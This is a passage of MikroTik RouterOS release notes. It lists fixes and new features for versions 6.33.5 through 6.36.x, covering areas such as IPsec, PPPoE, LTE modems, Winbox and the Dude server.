*) ipsec - don't log authtype mismatch as critical;
*) ipsec - fixed xauth parameter printing in terminal;
*) pppoe - fixed kernel crash caused by dial-on-demand when used with fastpath;
*) pppoe - fixed master interface l2mtu check, could result in assumption that master interface can handle 14 byte bigger packet than it actually can (broken in 6.36);
*) simple queues - fixed issue which caused additional/unnecessary CPU load;
*) vlan - do not allow to add new vlan interface with mtu higher than l2mtu;
*) tile - fixed rare kernel crash when usb device is being attached;

What's new in 6.36.2 (2016-Aug-22 12:54):

*) arm - show cpu frequency under resources menu;
*) capsman - fixed upgrade policy;
*) ccr/crs - fixed SFP+ interface ddmi info reporting function. Info is now refreshed on regular intervals;
*) conntrack - fixed ipv6 timeout display;
*) conntrack - fixed removing icmpv6 connections;
*) dns - avoid unnecessary dynamic server address saving in storage;
*) dns - allow to set query-server-timeout and query-total-timeout only greater than 0s;
*) dns - fixed lockup when dynamic dns server address 0.0.0.0 was received;
*) export - updated default values in /system routerboard settings menu;
*) partitions - fixed crash on repartition when there is not enough free space;
*) sstp - fixed disconnects on transmit for multicore systems;
*) switch - fixed configuration reload on CRS switches;
*) winbox - make queue tree default queue type default-small;

What's new in 6.36.1 (2016-Aug-05 09:39):

*) address-list - allow DNS names with "_" symbol;
*) address-list - check for duplicates when domain name is used in address field;
*) bridge - fixed kernel failure when set-priority action was used in bridge firewall;
*) dns - avoid unnecessary static entry saving in storage;
*) email - increased time which email tool can spend while sending message;
*) export - removed unnecessary "log-prefix" on firewall export;
*) firewall - fixed time based rules on time/timezone changes;
*) log - logs loaded from disk after reboot didn't have correct topics;
*) lte - fixed access technology update;
*) ovpn - add special exception route for tunnel itself when using add-default-route;
*) ping - fixed freezing on "not running" interfaces;
*) resource - fixed free-memory reporting after disk eject;
*) snmp - fixed packet corruption when multiple trap-targets were used;
*) tile - fixed rare kernel crash when fastpath is being active;
*) traffic-flow - fixed kernel failure when traffic-flow target uses small mtu;
*) upnp - fixed nat rule dst-port by making it visible again;
*) upnp - updated to make it work with more UPnP implementations (for example, latest Skype);
*) vrrp - fixed transition to backup state when ipv6 mode and equal priorities are used;
*) webfig - allowed user password changing (broken in v6.36);
*) x86 - fixed crash when igmp-proxy interface becomes "not running" while passing traffic;

What's new in 6.36 (2016-Jul-20 14:09):

*) arm - added Dude server support;
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=8&t=110428);
*) dude - server package is now made smaller. client side content upgrade is now removed from it and is downloaded straight from our cloud. So workstations on which client is used will require access to wan. Alternatively upgrade must be done by reinstalling the client on each new release;
*) firewall - added "/interface list" menu which allows to create list of interfaces which can be used as in/out-interface-list matcher in firewall and use as a filter in traffic-flow;
*) firewall - added pre-connection tracking filter - "raw" table, that allow to protect connection-tracking from unnecessary traffic;
*) firewall - allow to add domain name to address-lists (dynamic entries for resolved addresses will be added to specified list);
*) wireless - wireless-fp is discontinued, it needs to be uninstalled/disabled before upgrade;
*) address - allow multiple equal ip addresses to be added if neither or only one is enabled;
*) address-list - make "dynamic=yes" as read-only option;
*) arm - fixed kernel failure on low memory;
*) arp - added arp-timeout option per interface;
*) bonding - fixed 802.3ad load balancing mode over tunnels ;
*) bonding - fixed bonding primary slave assignment for ovpn interfaces after startup;
*) bonding - fixed crash on RoMON traffic transmit;
*) bonding - implemented l2mtu value == smallest slave interfaces l2mtu;
*) capsman - fixed crash when running over ovpn;
*) certificate - added automatic scep renewal delay after startup to avoid all requests accessing CA at the same time;
*) certificate - cancel pending renew when certificate becomes valid after date change;
*) certificate - display issuer and subject on check failure;
*) certificate - do not exit after card-verify;
*) certificate - force scep renewal on system clock updates;
*) chr - fixed CHR seeing its own system disk mounted as additional data disk;
*) clock - fixed time keeping for SXT ac, 911L, cAP, mAP lite, wAP;
*) clock - save current time to configuration once per day even if there are no time zone adjustments pending;
*) cloud - fixed export order;
*) console - fixed get false function;
*) console - show message time in echo log messages;
*) defconf - changed channel extension to 20/40/80mhz for all ac boards;
*) dhcp-pd - correct server listing for commands;
*) dhcp-server - fixed radius framed route addition after reboot on client renew;
*) dhcpv6-client - fixed ia lifetime validation when it is set by dhcpv6 client;
*) dhcpv6-relay - set packet link-address only when it is manually configured;
*) dhcpv6-server - fixed binding last-seen update;
*) disk - added support for Plextor PX-G128M6e(A) SSD on CCR1072;
*) email - fixed send from winbox;
*) email - removed subject and body length limit;
*) ethernet - fixed incorrect ether1 link speed after reboot on rb4xx series routers;
*) ethernet - fixed memory leak when setting interface without changing configuration;
*) fastpath - fixed kernel failure when fastpath handles packet with multicast dst-address;
*) fetch - support tls host name extension;
*) firewall - added udplite, dccp, sctp connection tracking helpers;
*) firewall - do not show disabled=no in export;
*) firewall - fixed spelling in built-in firewall commentary;
*) gps - fixed longitude seconds part;
*) health - fixed broken factory voltage calibration data for some hAP ac boards;
*) health - fixed incorrect voltage after reboot on RB2011UAS;
*) icmp - fixed kernel failure when icmp packet could not be processed on high load;
*) ippool6 - fixed crash on acquire when prefix length is equal with pool prefix length;
*) ipsec - add dead ph2 detection exception for windows msgid noncompliance with rfc;
*) ipsec - added dead ph2 reply detection;
*) ipsec - don't register temporary ph2 on dead list;
*) ipsec - fix initiator modecfg dynamic dns;
*) ipsec - fixed AH with SHA2;
*) ipsec - fixed checks before accessing ph1 nat options;
*) ipsec - fixed mode-config export;
*) ipsec - fixed route cache overflow when using ipsec with route cache disabled;
*) ipsec - fixed windows msgid check on x86 devices;
*) ipsec - show remote peer address in error messages when possible;
*) ipsec - store udp encapsulation type in proposal;
*) kernel - fixed possible kernel deadlock when Sierra USB mode is being used;
*) l2tp - fixed crash when rebooting or disabling l2tp while there are still active connections;
*) lcd - reduced lowest backlight-timeout value from 5m to 30s;
*) license - do not expire demo license right after fresh installation of x86;
*) log - added whole scep certificate chain print;
*) log - increase excessive multicast/broadcast warning threshold every time it is logged;
*) log - make logging process less aggressive on startup;
*) lte - added allow-roaming option for Huawei MU709, ME909s devices;
*) lte - added cinterion pls8 support;
*) lte - added support for Huawei E3531;
*) lte - added support for ZTE ZM8620;
*) lte - added use-peer-dns option (will work only combined with add-default-route);
*) lte - changed driver loading for class 2 usb rndis devices;
*) lte - display message in lte,error log if no response received;
*) lte - display message in lte,error log when PIN is required;
*) lte - fix crash on SXT LTE while resetting card while at high traffic;
*) lte - fixed access technology logging;
*) lte - fixed connection for Huawei without cell info;
*) lte - fixed modem init when pin request present;
*) lte - fixed modem network configuration version checks;
*) lte - fixed network-mode support after downgrade;
*) lte - Huawei MU609 must use latest firmware to work correctly;
*) lte - improved multiple same model modems identification;
*) lte - show uicc for Huawei modems;
*) lte - use only creg result codes as network status indications;
*) mesh - fixed crash when connection references a mesh network but it is not available any more;
*) modem - added support for Alcatel OneTouch X600;
*) modem - added support for Quectel EC21 and EC25;
*) modem - added support for SpeedUP SU-900U modem;
*) nand - improved nand refresh feature to enhance stored data integrity;
*) ovpn - enable perfect forwarding secrecy support by default;
*) ovpn - fixed compatibility with OpenVPN 2.3.11;
*) pppoe - allow to set MTU and MRU higher than 1500 for PPPoE;
*) pppoe - do not allow to send out bigger packets than l2mtu if mrru is provided;
*) proxy - limit max ram usage to 80% for tile and x86 devices;
*) queue - reset queue type on interfaces which default queue type changes to no-queue after upgrade;
*) rb2011 - fixed ether6-ether10 flapping when two ports from both switch chips are in the same bridge;
*) rb3011 - fixed port flapping on ether6-ether10;
*) rb3011 - fixed reset button functionality;
*) rb3011 - fixed usb driver load;
*) rb3011 - fixed usb storage mounting;
*) rb3011 - improved performance on high cpu usage;
*) route - added suppport for more than 8 bits of options;
*) route - fixed ospf by handling ipv6 encoded prefixes with stray bits;
*) sniffer - fixed ipv6 address matching;
*) snmp - fixed get function for snmp>=v2 when oid does not exist;
*) snmp - fixed interface stats branch from MikroTik MIB;
*) snmp - report current access technology and cell id for lte modems;
*) snmp - report ram memory as ram instead of other;
*) ssh - add rsa host key size parameter;
*) ssh-keygen - add rsa key size parameter;
*) ssl - do not exit while there still are active sessions;
*) ssl - fixed memory leak on ssl connect/disconnect (fetch, ovpn, etc.);
*) sstp - fixed dns name support in connect-to field if http-proxy is specified;
*) supout - erase panic data properly on Netinstall;
*) switch - fixed switch compact export;
*) timezone - updated timezone information from tzdata2016e release;
*) traffic-flow - added ipfix support (RFC5101 and RFC5102);
*) tunnel - added option to auto detect tunnel local-address;
*) tunnel - fixed rare crash by specifying minimal header length immediately at tunnel initialization;
*) upnp - fixed nat rule dst-port by making it visible again;
*) usb - I-tec U3GLAN3HUB usb hub/ethernet dongle now shows up correctly as ethernet interface;
*) usb - implement possibility to recognize usb hubs/ethernet-dongles (if usb hubs/ethernet-dongles are not recognized with this version - send supout.rif file);
*) userman - fixed crash on database upload;
*) userman - use ipnpb.paypal.com for payment verification;
*) wap-ac - fixed performance problems with 2.4GHz wireless (additional reboot after upgrade required);
*) webfig - do not allow to press OK or Apply if current configuration values are not loaded yet;
*) webfig - reduced refresh time for wireless registration table to 1 second;
*) winbox - added 2ghz-g/n band for wireless-rep;
*) winbox - added icons to bridge filter actions similar to ip firewall;
*) winbox - added support for ipv6 dhcp relay;
*) winbox - allow to reorder hotspot walled-garden & walled-garden-ip rules;
*) winbox - do not allow to specify vlan-mode=no-tag in capsman datapath config;
*) winbox - do not show filter for combined fields like bgp-vpn4 RD;
*) winbox - do not show mode setting for WDS interfaces;
*) winbox - fixed crash on disconnect in secure mode;
*) winbox - fixed crash when using ctrl+d;
*) winbox - fixed safe mode;
*) winbox - improve filtering on list fields;
*) winbox - report correctly dude users in active users list;
*) winbox - set default sa-learning value to "yes" for CRS Ingress VLAN Translation rules;
*) winbox - show action column as first in bridge firewall;
*) winbox - show error when telnet is not allowed because of permissions;
*) wireless - fixed multiple wireless packages enabled at the same time after upgrade;
*) wireless-rep - added initial API support for snooper;
*) wireless-rep - fixed crash on nv2 reconnect;
*) wireless-rep - fixed scan-list unset;
*) wireless-rep - treat missing SSID element as hidden SSID;

What's new in 6.35.4 (2016-Jun-09 12:02):

*) address-list - make "dynamic=yes" as read-only option;
*) bonding - fixed 802.3ad load balancing mode over tunnels ;
*) bonding - fixed bonding primary slave assignment for ovpn interfaces after startup;
*) bonding - fixed crash on RoMON traffic transmit;
*) dhcpv6 client - fixed ia lifetime validation when it is set by dhcpv6 client;
*) disk - added support for Plextor PX-G128M6e(A) SSD on CCR1072;
*) ethernet - fixed memory leak when setting interface without changing configuration;
*) firewall - do not show disabled=no in export;
*) health - fixed broken factory voltage calibration data for some hAP ac boards;
*) health - fixed incorrect voltage after reboot on RB2011UAS;
*) ipsec - fixed mode-config export;
*) ipsec - fixed route cache overflow when using ipsec with route cache disabled;
*) lte - use only creg result codes as network status indications;
*) ovpn - enable perfect forwarding secrecy support by default;
*) rb3011 - fixed port flapping on ether6-ether10;
*) rb3011 - fixed reset button functionality;
*) rb3011 - improved performance on high cpu usage;

What's new in 6.35.3 (2016-Jun-01 7:55):

(factory only release)

What's new in 6.35.2 (2016-May-02 10:09):

*) discovery - fixed identity discovery (introduced in 6.35.1);
*) firewall - fixed policy routing configurations (introduced in 6.35rc38);
*) log - fixed time zone adjustment (introduced in 6.35.1);
*) queue - fixed interface queue type for ovpn tunnels;
*) snmp - fixed snmp timeout (introduced in 6.35.1);
*) vrrp - fixed missing vrrp interfaces after upgrade (introduced in 6.35.1).

What's new in 6.35.1 (2016-Apr-25 09:29):

*) bonding - do not corrupt bonding statistics on configuration changes;
*) bonding - fixed crash when vlan parent mtu is higher than bonding mtu;
*) ethernet - do not allow mtu to be higher than l2mtu and l2mtu to be higher than max-l2mtu (reduce automatically on upgrade if it was wrong before);
*) log - fixed reboot log messages;
*) lte - do not allow to set multiple modes when it is not supported;
*) lte - fixed address acquisition on Huaweii LTE interfaces;
*) winbox - show voltage in Health only if there actually is voltage monitor;
*) wireless - fixed issue when CAPsMAN could lock CAPs interface;

What's new in 6.35 (2016-Apr-14 12:55):

*) arp - apply Linux Kernel patch to stop RouterOS from randomly exhibiting misplaced ARPs;
*) mipsbe - (excluding RB4xx and CRS series) fixed rare ethernet tx buffer corruption;
*) nand - implemented once a week nand refresh to improve stored data integrity (will increase sector writes);
*) pppoe-client - implemented fastpath support;
*) l2tp - implemented l2tp and lns fastpath/fasttrack support;
*) queue - added bucket-size setting to queues (derived from max-limit);
*) tile - fixed rare situation when some cores decide not to take part in packet processing till next reboot;
*) tunnels - fixed performance slowdown on any other tunnel disable/enable;
*) winbox - increased minimal required winbox version to 3.4;
*) wireless - added new package "wireless-rep";
*) wireless - improved 1-chain 802.11ac station compatibility with other vendor multi-chain APs;
*) address-list - fixed crash in low memory situations;
*) bonding - fixed crash when creating vlans on bonding interface;
*) capsman - added 802.11g/n band;
*) capsman - fixed capsman extension channel names;
*) certificate - revoked certificates not showing as (R)evoked;
*) certificate - allow manual crl url addition;
*) chr - added support for VLAN on Hyper-V;
*) chr - fixed Hyper-V booting from SCSI;
*) chr - fixed Hyper-V on windows 8/10 reboot loop;
*) chr - fixed bridge firewall;
*) chr - fixed kernel crash when virtual ethernet was not connected to anything in Hyper-V;
*) chr - implemented automatic storage increase on disk image size increase;
*) chr - implemented kernel crash saving to autosupout.rif (will utilize additional 24Mb of RAM);
*) chr - make shutdown request from hyper-v work (might fix other hypervisor as well);
*) chr - no more installation on first boot;
*) chr - try to renew expired license once a hour instead of 100h;
*) cloud - don't write minor status changes to storage;
*) console - fixed print follow in "/ip dns cache" menu;
*) console - show RouterOS Version in /interface wireless scan;
*) console - sort completions/hints in natural order;
*) console - update copyright notice;
*) defconf - fixed default configuration for SXT LTE;
*) dhcpv6-client - fixed wrong error message;
*) dhcpv6-client - fix ia expiration and lifetime validation;
*) dhcpv6-server - acquire binding on renew if it does not exist;
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=8&t=104395);
*) dude - fixed dude login logging, no more shows as winbox login;
*) email - fixed send cmd server addr override;
*) ethernet - add option to see S-GPON-ONU module, GPON side SN in "/int eth mon sfp#";
*) ethernet - do not allow to set self as master port;
*) export - bonding did not show up in global export;
*) export - exclude default values from export in "/interface l2tp-server server" menu;
*) export - fixed export when ipv6 address was taken from pool;
*) export - fixed rare situations when not whole config was exported;
*) export - updated defaults for compact export;
*) fastpath - fixed crash when packet arrives on disabled interface;
*) fastpath - fixed show rx-bits-per-second on all VLAN interfaces;
*) fastpath - improved vlan fastpath;
*) fasttrack - fixed timer updating in connections table for fasttrack connections;
*) fetch - decrease connection idle timeout;
*) firewall - added experimental "action=route" in mangle prerouting - that forces packets to specific gateway by ignoring routing decisions (CLI only);
*) health - always report fan speed (even if it is 0);
*) health - swap fan2 and fan3 on CCR1072;
*) hotspot - clean-up all dead entries at once;
*) hotspot - fixed possible deadlock;
*) hotspot - improved html page resistance against attacks;
*) hotspot - make video tag work properly on hotspot login.html page
*) ip - rename max-arp-entries to less confusing max-neighbor-entries;
*) ippool6 - fixed potential crash;
*) ipsec - always re-key ph1 because it was possible that ph1 without DPD would expire;
*) ipsec - better flush on proposal change;
*) ipsec - fixed crash on policy update;
*) ipsec - fixed fast ph2 SA addition;
*) ipsec - fixed larval SA refresh for display;
*) ipsec - fixed multiple consecutive dynamic policy flush;
*) l2tp & pppoe - fixed user traffic accounting when fastpath was used;
*) l2tp - introduced per tunnel allow-fast-path option;
*) l2tp - added support for Hidden AVP, it is needed for proxy authentication;
*) l2tp - added support for max-sessions;
*) l2tp - added support for proxy authentication when receiving forwarded PPPoE sessions;
*) l2tp - fixed small memory leak on reconnects;
*) lcd - fixed branding packet logo drawing on startup;
*) led - fixed crash on assigned interface removal;
*) led - turn on fault led on CCR1072 if CPU too hot;
*) leds - fixed AP-CAP led blinking after successful association to CAPsMAN;
*) lte - added ipv6 support for SXT LTE;
*) lte - changed AT command processing;
*) lte - changed AT parsing because supported Huawei modems use unsolicited events instead of polling;
*) lte - fixed bandlux modem dialing;
*) lte - fixed crash on early initialization;
*) lte - improve situation when SXT modem never finds operator;
*) lte - replaced signal-strength with rssi in info command;
*) lte - support Alt38XX modem;
*) lte - support for zte mf820s2;
*) lte - supported modems now use unsolicited events for network monitoring;
*) lte - use timer for modem info;
*) map lite - added hardware WPS button support;
*) mpls - do not reset VPLS on TE tunnel re-optimize;
*) ntp - fixed ntp client hangs in reached state;
*) ospf - fixed crash when getting neighbor router-id in NBMA area;
*) ppp - fixed ppp interface reconnect when uPnP was used;
*) ppp - close connection if peer wants to re-authenticate;
*) ppp - fixed memory leak high number of pppoe clients to the same server;
*) ppp - fixed ppp crash if lcp packets were lost and authentication got delayed;
*) ppp - fixed some clients can not connect due to LCP restart;
*) pppoe - added rfc4679 support;
*) pppoe - fixed crash when removing pppoe service;
*) pppoe-server - added pado-delay option;
*) profiler - classify certificate signing;
*) proxy - fixed ftp request url decode;
*) queue - improve "/queue interface" menu;
*) quickset - fixed invalid date adjusted the signal threshold for the signal chart and refresh rate;
*) quickset - fixed situations when hidden password was passed as ******* from winbox nd webfig;
*) radius - warn radius client if incorrect secret is being used;
*) rb3011 - fixed sfp compatibility with CCR when using direct attached cables;
*) rb3011 - fixed time keeping;
*) rb3011 - make ether6-ether10 work if SFP module is present on bootup;
*) romon-ssh - fixed active addresses for romon user;
*) route - do not show duplicate gateway on connected route;
*) route - fixed filter by routing table;
*) routing - fixed rare kernel failure on different dynamic routing configurations;
*) routing - fixed routing-marks were not erased from memory when they are not being used;
*) services - do not show ssh entry under ip services if security package is disabled;
*) snmp - don't group oids for bulk get with maxreps > 1 ;
*) snmp - fixed cpu load reporting to 1min average and change oid to 1.3.6.1.4.1.2021.11.10.0;
*) snmp - fixed dhcpv4 lease hwaddr format according to mib;
*) snmp - fixed getbulk result ordering with multiple request OIDs;
*) ssh - simplify login process;
*) ssl - optimized certificate update;
*) system - log time changes;
*) tile - corrected max-l2mtu;
*) tile - fixed fastpath related memory leak;
*) tile - fixed performance regression on switch chip (introduced in 6.33rc18);
*) tile-crypto - fixed minor memory leak;
*) tool fetch - fixed https cleanup on user stop while handshaking;
*) trafficgen - fixed console arguments;
*) trafficgen - fixed crash when unexpected stream reappears;
*) trafflow - fixed potential deadlock;
*) ups - fixed entering hibernate mode when below battery capacity limit;
*) users - added separate RoMoN policy;
*) webfig - fixed firewall rule sorting did not work in other chains except all;
*) webfig - show single item groups as optional values;
*) webfig - sort numeric columns numerically even if they contain some text;
*) winbox - added "pw-type" to "/interface vpls bgp-vpls" menu;
*) winbox - added "use-control-word" and "pw-mtu" to "/interface vpls cisco-bgp-vpls" menu;
*) winbox - added /interface wireless setup-repeater;
*) winbox - added all the rates settings to the capsman;
*) winbox - added flip-screen option to lcd settings;
*) winbox - added init-delay option to routerboard settings;
*) winbox - added ipv6 firewall missing log option;
*) winbox - added missing eap-ttls-mschamv2 method to wireless security profile;
*) winbox - added mtu=auto support to eoipv6 tunnel;
*) winbox - added sfp-mac for GPON interfaces;
*) winbox - added support for new settings from wireless-rep package;
*) winbox - added support for route action in mangle rules;
*) winbox - allow to set additional-network-modes;
*) winbox - allow to set multiple dh-groups;
*) winbox - disable autostart for wireless scan,snooper,align etc. on open;
*) winbox - do not show "enable-jumper-reset" setting on devices without serial port;
*) winbox - do not show real-tx-power column in current-tx-power by default;
*) winbox - fixed unset options in /routing ospf interface menu;
*) winbox - hotspot default-trial user shows profile as "unknown" in Winbox;
*) winbox - improved winbox connection loss detection, fixes winbox safe mode;
*) winbox - limit ospf key to 16 symbols;
*) winbox - make additional-network-mode optional for lte interface;
*) winbox - make build with latest lte changes;
*) winbox - make mrru disabled and set mtu+mru to auto by default on new servers;
*) winbox - show "usb-power-reset" option on all boards that have it;
*) wireless - fixed crash on nstreme-dual interface stats update;
*) wireless-rep - added 802.11g/n only band;
*) wireless-rep - added STEP feature for the scan-list;
*) wireless-rep - added WPS client support;
*) wireless-rep - added support for saving wireless scan results to file;
*) wireless-rep - added support for wireless background scan for 802.11 protocol;
*) wireless-rep - added support for wireless repeater mode for 802.11 protocol;
*) wireless-rep - added support for wireless scan rounds setting;
*) wireless-rep - adjust roaming scan times;
*) wireless-rep - allow to connect to AP after scan;
*) wireless-rep - do not allow empty ssid for AP modes;
*) wireless-rep - fixed crash on non-HT clients;
*) wireless-rep - fixed latency issues with Intel wireless clients;
*) wireless-rep - fixed nv2 protocol;
*) wireless-rep - fixed qos frame-priority when nv2 protocol used in station-wds mode;
*) wireless-rep - fixed signal leds;
*) wireless-rep - fixed speed issue when connected with Intel 802.11ac;
*) wireless-rep - initial support for station roaming for station mode in 802.11 protocol;
*) wireless-rep - request interface name for setup-repeater;
*) wireless-rep - use full identity where possible;
*) wireless-rep,capsman - added more configuration settings;
*) wireless-rep,capsman - added rate config support.

What's new in 6.34.4 (2016-Mar-24 13:13):

*) bonding - fixed crash on bonding slave release;
*) bonding - fixed mac-address disappearance after reboot in specific setups;
*) chr - fixed reboots with license and queues;
*) console - allow unknown scan-list names on wireless configuration to fix import;
*) ethernet - fixed Netmetal, QRT, DynaDish, SXT ac linking at 10/100Mbps (introduced in 6.34.x);
*) fastpath - fixed rare kernel failure;
*) ipsec - take into account ip protocol in kernel policy matcher;
*) mac-winbox - try to aggregate packets & resend all pending packets on timeout;
*) ppp - do not crash when received multiple CBCP packets;
*) ppp - fixed crash when ppp interface gets disconnected and user gets authenticated at the same time (most probable with slow RADIUS server);
*) quickset - fixed wan interface selection on devices with SFP interfaces;
*) quickset - use 5GHz interface instead of 2GHz interface on SXT Lite5 ac;
*) rb3011 - fixed high cpu load breaks ethernet stats;
*) rb3011 - fixed link down messages;
*) romon - fixed romon discovery after romon ID change;
*) timezone - fixed reboot by watchdog when selecting timezones from the end of list;
*) userman - fixed www crash;
*) winbox - allow to show revoked & authority flags at the same time;
*) winbox - correctly recognise if there is need to report fan information under system health;
*) winbox - do not use area v2 names instead of ospf v3 area names;
*) winbox - make mac-winbox work with RB850.

What's new in 6.34.3 (2016-Mar-09 10:03):

*) ccr1072 - fix traffic halting when sfp+ 1-4 or 5-8 where all disabled;
*) chr - fixed crash when layer7 firewall option used;
*) fetch - fixed TTFP download;
*) gre - fixed memory leak;
*) lcd - fixed security screen did not show ip addresses on ccr;
*) netinstall - fixed link negotiation for different sfp modules;
*) ppp - fixed ppp crash;
*) queue-tree - improved nested queue limit calculation;
*) ssh - fixed crash on failed scp read;
*) winbox - allow to set multiple dh-groups;
*) winbox - do not show fan statuses in passive cooling CCR1009;
*) winbox - fixed typo in "echo reply";
*) winbox - fixed unset options in /routing ospf interface menu;

What's new in 6.34.2 (2016-Feb-18 06:31):

*) dude - updated to the latest Release Candidate revision (v6.35rc11);
*) dude - (changes discussed here: http://forum.mikrotik.com/viewtopic.php?f=8&t=104395);
*) chr - fixed high rate limitation;
*) dhcpv6 client - fix pd hint with empty address;
*) ipsec - fix console peer aes enc algorithm display;
*) l2tp - ipsec peer & policy sometimes was not removed after l2tp interface disable;
*) log - try not to loose disk messages and warn if lost any;
*) lte - fix allowed bands for RBSXTLTE3-7;
*) pptp - fixed kernel crash when receiving fragmented packet with fragmented header;
*) proxy - store error.html on flash if it is available;
*) ssh - fixed connection stalling;
*) ssh - make export verbose work;
*) switch - make "sa-learning=yes" by default when adding Ingress VLAN Translation rules;
*) tile - fixed possible kernel failure with disabled watchdog timer caused by DDoS attack;
*) ups - fix waiting for AC power restore in hibernate mode;
*) winbox - added factory-firmware field to system/routerboard;
*) winbox - fixed email address saving;
*) winbox - fixed multi value field display (i.e. web proxy ports);
*) winbox - fixed incomplete ARP entries are not refreshed;
*) www - fixed www crash.

What's new in 6.34.1 (2016-Feb-02 14:08):

*) interface - fixed stats that were 8x smaller;
*) traffic-monitor - fixed stats that were 8x smaller;
*) smips - properly detect smips boards for winbox & webfig.

What's new in 6.34 (2016-Jan-29 10:25):

*) mipsle - architecture support dropped (last fully supported version 6.32.x);
*) dude - The reports of my death have been greatly exaggerated;
*) dude - dude RouterOS package added for tile and x86 (CHR) architecture;
*) dude - package included by default to all CHR images;
*) dude - initial work on dude integration into RouterOS;
*) bgp vpls - fixed initialization after reboot;
*) mpls - forwarding of VRF over TE tunnel stopped working after BGP peer reset;
*) ipsec - improved TCP performance on CCRs;
*) btest - significantly increased TCP bandwidth test performance;
*) winbox - fixed possible busy-loop on v2.x with latest 6.34RC versions;
*) cerm - allow to sign certificates from imported CAs created with RouterOS;
*) ldp - fix MPLS PDU max length;
*) net - improve 64bit interface stats support;
*) routerboard - print factory-firmware version in routerboard menu;
*) snmp - add oid from ucd mib for total cpu load OID 1.3.6.1.4.1.2021.11.52.0;
*) winbox - add extra items automatically to multi-line fields if at least one of them is required;
*) winbox - implemented full ipv6 dhcp client;
*) winbox - update blocked flag if user changed blocked field in dhcp server lease;
*) mac-telnet - fixed backspace when typing login username;
*) sstp - allow ECDHE when pfs enabled;
*) lte - fixed info command for Cinterion EHS5-E modem;
*) fast-path - fixed kernel crash on on/off;
*) licensing - fixed that some old 7 symbol keys could not be upgraded;
*) ssh - fixed possible kernel crash;
*) console - fixed crash on creating variable with "?" in it;
*) chr - fix SSH key import on AWS;
*) crs212 - fix 1Gbps ether1 linking problem;
*) timezone - use backward timezone aliases;
*) lte - support serial port for DellWireless 5570;
*) lte - improved dhcp handling on interfaces that doesn't support it;
*) ipsec - allow my-id address specification in main mode;
*) dhcpv6 client - fix remove when client reappears on restart;
*) default config - fix hAP lite with one wireless;
*) firewall - added inversion support for "limit" option;
*) firewall - added bit rate matching for "limit" option;
*) firewall - improved performance for "limit" option;
*) dhcpv6-client - fix ia lifetime check;
*) ipsec - prioritize proposals;
*) ipsec - support multiple DH groups for phase 1;
*) netinstall - fix apply default config;
*) tile - make sure that SFP rj45 modules that use forced 1G FD settings work correctly after system reboot;
*) wireless - added WPS buttons support on hAP and hAP ac lite;
*) upnp - added comment for dynamic dst-nat rules to inform what host/program required it;
*) webfig - recognize properly CHR;
*) chr - license fix for AWS and similar solutions;
*) arm - fix usb modem modules on ARM;
*) dhcpv6-client - fixed stopped state;
*) netinstall - sort packages by name;
*) firewall - do not allow to add new rule before built-in (reverted);
*) winbox - include FP in fast-path column names;
*) ipsec - fix phase2 hmac-sha-256-128 truncation len from 96 to 128
This will break compatibility with all previous versions and any other
currently compatible software using sha256 hmac for phase2;
*) ssh, ftp - make read, write user group policy aware;
*) tunnel - fix keep-alive (introduced in 6.34rc);
*) cerm - show last crl update time;
*) quicket - support CAP mode on all existing wireless packages;
*) wlan - add united states3 country;
*) fast-path - fix locking issue which could lead to reboot loop (introduced in 6.34rc20);
*) userman4 - try loading signup files from db path first;
*) sstp - allow to limit tls version to v1.2 only;
*) chr - make tool profile work on 64bit x86;
*) dhcpv6-server - added binding server=all option;
*) hotspot - added html-directory-override & recognize default hotspot user;
*) hotspot - fixed export of default trial user;
*) hotspot - fixed memory leak on https requests;
*) winbox - allow to specify amsdu-limit & amsdu-threshold on 11n wifi cards;
*) winbox - added multicast-buffering & keepalive-frames settings to wireless interfaces;
*) CHR - implemented trial support for different CHR speed tiers;
*) dhcpv6-client - fix add route/address;
*) usb - enable ch341 serial module;
*) lte - make sure that both LTE miniPCI-e cards are recognized;
*) winbox - show Common-Name of certificates in certificate list;
*) winbox - added units to PCQ queue fields;
*) net - do not break connection when interface is added to bridge;
*) hotspot - show cookie add/remove events in hotspot,debug log;
*) hotspot - allow static entries with the same mac on multiple hotspot servers;
*) hotspot - do not remove mac-cookie in case of radius timeout;
*) hotspot - added byte limits option for default-trial users;
*) ipsec - make sure that dynamic policy always has dynamic flag;
*) CAPsMAN - use CAP name in log when remote-cap is deleted (wireless-cm2);
*) hotspot - fixed login by mac-cookie when roaming among hotspot servers;
*) hotspot - add html-directory-override for read-only directory on usb flash;
*) hotspot - add uptime, byte and packet counter variables to logout script;
*) net - fix statistics counters jumping up to 4G;
*) firewall - SIP helper update for newer Cisco phones;
*) usermanager - fixed usermanager web page crash;
*) ipsec - fixed active SAs flushing;
*) hotspot - added option to login user manually from cli;
*) hotspot - fixed trial-uptime parsing from CLI to Winbox/Webfig;
*) lte - added support for multiple E3372 on the same device;
*) modem - added wpd-600n ppp support;
*) console - fixed incorrect disabled firewall rule matching to "invalid flag";
*) dns - fix for situation when dynamic dns servers could disappear;
*) sfp - fix 10g ports in 1g mode (introduced in 6.34rc1);
*) CCR1072 - added support for S-RJ01 SFP modules;
*) trafficgen - fixed issue that traffic-generator could not be started twice without reboot;
*) dhcpv6-server - replace delay option with preference option.

What's new in 6.33.6

*) winbox - show properly route-distinguisher for bgp vpn4;
*) winbox - show dhcp server name in dhcp leases;
*) ppp - make CoA work correctly with address-lists;
*) winbox - fixed tab names to correspond to console;
*) winbox - show only actual switch-cpu ports in switch setting combobox;
*) winbox/webfig - fixed version column ordering in ip neighbors list;
*) webfig - fixed switch port "default vlan id" has missing "auto" value;
*) webfig - fixed firewall connection-bytes option;
*) ipsec - fixed kernel failure after underlying tunnel has been disabled/enabled;
*) romon - allow to see device identity if it is longer than 31 character;
*) fastpath - show fp counters in /interface monitor aggregate;
*) bridge firewall - fix chain check (broken since 6.33.2);
*) bridge firewall - fixed crash when jump rule points to disabled custom chain;
*) smb - fix crash when changing user which has open session;
*) address-list - properly remove unused address-lists from drop-downs;
*) fetch - fixed closure after 30 seconds;
*) capsman - fix radius accounting stop message;
*) log - reopen log file if deleted;
*) packing - fix tcp/udp checksums when simple packing is used;
*) tile - fix ipsec freeze after SA updates;
*) upnp - fixed missing in-interface option for dynamic dst-nat rules;
*) tunnel - fix complaining about loop after ~248 days;
*) vrrp - make sure that VRRP gets state on bootup;
*) ppp - fixed rare kernel crash (introduced in v6.33);
*) ppp - do not allow empty name ppp secrets;
*) ssh - fix active user accounting.

What's new in 6.33.5 (2015-Dec-28 09:13):

*) mipsle - architecture support dropped (last fully supported version 6.32.3);
